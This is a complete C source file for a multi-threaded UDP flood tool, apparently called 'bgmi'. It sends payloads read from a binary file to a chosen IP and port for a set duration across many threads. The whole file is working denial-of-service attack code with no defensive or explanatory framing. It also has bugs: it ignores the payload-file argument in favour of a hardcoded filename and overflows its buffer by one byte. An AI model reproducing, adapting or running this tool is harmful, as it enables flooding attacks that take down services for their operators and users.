#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 1024

void usage() {
    printf("Usage: ./bgmi <target_ip> <target_port> <duration> <threads> <payload_file>\n");
    exit(1);
}
struct thread_data {
    char *ip;
    int port;
    int time;
    char **payloads;
    int payload_count;
};
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        for (int i = 0; i < data->payload_count; i++) {
            if (sendto(sock, data->payloads[i], strlen(data->payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }
    close(sock);
    pthread_exit(NULL);
}
char **read_payloads_from_file(const char *filename, int *count) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Could not open payload file");
        return NULL;
    }
    char **payloads = NULL;
    *count = 0;
    while (1) {
        char *payload = malloc(MAX_PAYLOAD_SIZE);
        size_t read_size = fread(payload, 1, MAX_PAYLOAD_SIZE, file);
        if (read_size == 0) {
            free(payload);
            break;
        }
        payload[read_size] = '\0';
        payloads = realloc(payloads, (*count + 1) * sizeof(char *));
        payloads[*count] = payload;
        (*count)++;
    }
    fclose(file);
    return payloads;
}
int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
    }
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    const char *payload_file = "darkespyt_payload.bin";
    int payload_count;
    char **payloads = read_payloads_from_file(payload_file, &payload_count);
    if (payloads == NULL) {
        exit(1);
    }
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time, payloads, payload_count};
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    for (int i = 0; i < payload_count; i++) {
        free(payloads[i]);
    }
    free(payloads);
    free(thread_ids);
    return 0;
}